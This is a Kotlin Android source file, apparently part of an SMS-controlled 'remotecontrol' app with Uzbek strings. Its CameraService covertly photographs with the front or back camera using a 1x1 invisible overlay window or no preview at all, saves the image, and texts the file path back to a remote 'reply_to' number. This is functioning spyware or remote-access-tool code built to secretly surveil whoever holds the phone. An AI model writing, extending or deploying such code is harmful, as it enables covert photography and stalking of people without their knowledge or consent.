package com.example.remotecontrol

import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.graphics.PixelFormat
import android.hardware.camera2.*
import android.media.ImageReader
import android.os.*
import android.util.Log
import android.view.WindowManager
import android.view.SurfaceView
import android.view.SurfaceHolder
import java.io.File
import java.io.FileOutputStream
import java.text.SimpleDateFormat
import java.util.*

class CameraService : Service() {

    private lateinit var replyTo: String
    private var cameraFacing: Int = CameraCharacteristics.LENS_FACING_BACK
    private lateinit var cameraManager: CameraManager
    private lateinit var imageReader: ImageReader
    private lateinit var backgroundHandler: Handler
    private lateinit var backgroundThread: HandlerThread
    private var cameraDevice: CameraDevice? = null
    private var windowManager: WindowManager? = null
    private var surfaceView: SurfaceView? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        replyTo = intent?.getStringExtra("reply_to") ?: ""
        val camera = intent?.getStringExtra("camera") ?: "back"
        cameraFacing = if (camera == "front") CameraCharacteristics.LENS_FACING_FRONT
                       else CameraCharacteristics.LENS_FACING_BACK

        startBackgroundThread()
        addOverlayWindow()
        return START_NOT_STICKY
    }

    private fun addOverlayWindow() {
        try {
            windowManager = getSystemService(Context.WINDOW_SERVICE) as WindowManager

            surfaceView = SurfaceView(this)

            val params = WindowManager.LayoutParams(
                1, 1,
                WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
                PixelFormat.TRANSLUCENT
            )

            windowManager?.addView(surfaceView, params)

            surfaceView?.holder?.addCallback(object : SurfaceHolder.Callback {
                override fun surfaceCreated(holder: SurfaceHolder) {
                    takePicture(holder)
                }
                override fun surfaceChanged(holder: SurfaceHolder, f: Int, w: Int, h: Int) {}
                override fun surfaceDestroyed(holder: SurfaceHolder) {}
            })

        } catch (e: Exception) {
            Log.e("CameraService", "Overlay xato: ${e.message}")
            takePictureWithoutPreview()
        }
    }

    private fun takePicture(holder: SurfaceHolder) {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == cameraFacing
            } ?: cameraManager.cameraIdList[0]

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()

                val file = saveImage(bytes)
                CommandHandler(this).sendSms(replyTo, "📸 Rasm olindi!\nFayl: ${file.name}\nYo'l: ${file.absolutePath}")
                cleanup()
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val surfaces = listOf(imageReader.surface, holder.surface)
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)

                    camera.createCaptureSession(surfaces, object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) {
                            cleanup()
                        }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { cleanup() }
                override fun onError(camera: CameraDevice, error: Int) {
                    Log.e("CameraService", "Kamera xato: $error")
                    CommandHandler(this@CameraService).sendSms(replyTo, "❌ Kamera xato: $error")
                    cleanup()
                }
            }, backgroundHandler)

        } catch (e: SecurityException) {
            CommandHandler(this).sendSms(replyTo, "❌ Kamera ruxsati yo'q")
            cleanup()
        } catch (e: Exception) {
            Log.e("CameraService", "Xato: ${e.message}")
            cleanup()
        }
    }

    private fun takePictureWithoutPreview() {
        try {
            cameraManager = getSystemService(Context.CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                cameraManager.getCameraCharacteristics(id)
                    .get(CameraCharacteristics.LENS_FACING) == cameraFacing
            } ?: cameraManager.cameraIdList[0]

            imageReader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
            imageReader.setOnImageAvailableListener({ reader ->
                val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                val buffer = image.planes[0].buffer
                val bytes = ByteArray(buffer.remaining())
                buffer.get(bytes)
                image.close()
                val file = saveImage(bytes)
                CommandHandler(this).sendSms(replyTo, "📸 Rasm: ${file.name}\n${file.absolutePath}")
                cleanup()
            }, backgroundHandler)

            cameraManager.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    val captureRequest = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                    captureRequest.addTarget(imageReader.surface)
                    camera.createCaptureSession(listOf(imageReader.surface), object : CameraCaptureSession.StateCallback() {
                        override fun onConfigured(session: CameraCaptureSession) {
                            session.capture(captureRequest.build(), null, backgroundHandler)
                        }
                        override fun onConfigureFailed(session: CameraCaptureSession) { cleanup() }
                    }, backgroundHandler)
                }
                override fun onDisconnected(camera: CameraDevice) { cleanup() }
                override fun onError(camera: CameraDevice, error: Int) { cleanup() }
            }, backgroundHandler)
        } catch (e: Exception) {
            Log.e("CameraService", "Xato: ${e.message}")
            cleanup()
        }
    }

    private fun saveImage(bytes: ByteArray): File {
        val timestamp = SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(Date())
        val file = File(getExternalFilesDir(null), "RC_$timestamp.jpg")
        FileOutputStream(file).use { it.write(bytes) }
        return file
    }

    private fun cleanup() {
        try {
            cameraDevice?.close()
            windowManager?.removeView(surfaceView)
        } catch (_: Exception) {}
        backgroundThread.quitSafely()
        stopSelf()
    }

    private fun startBackgroundThread() {
        backgroundThread = HandlerThread("CameraBackground").also { it.start() }
        backgroundHandler = Handler(backgroundThread.looper)
    }

    override fun onDestroy() {
        super.onDestroy()
        try { backgroundThread.quitSafely() } catch (_: Exception) {}
    }

    override fun onBind(intent: Intent?): IBinder? = null
}
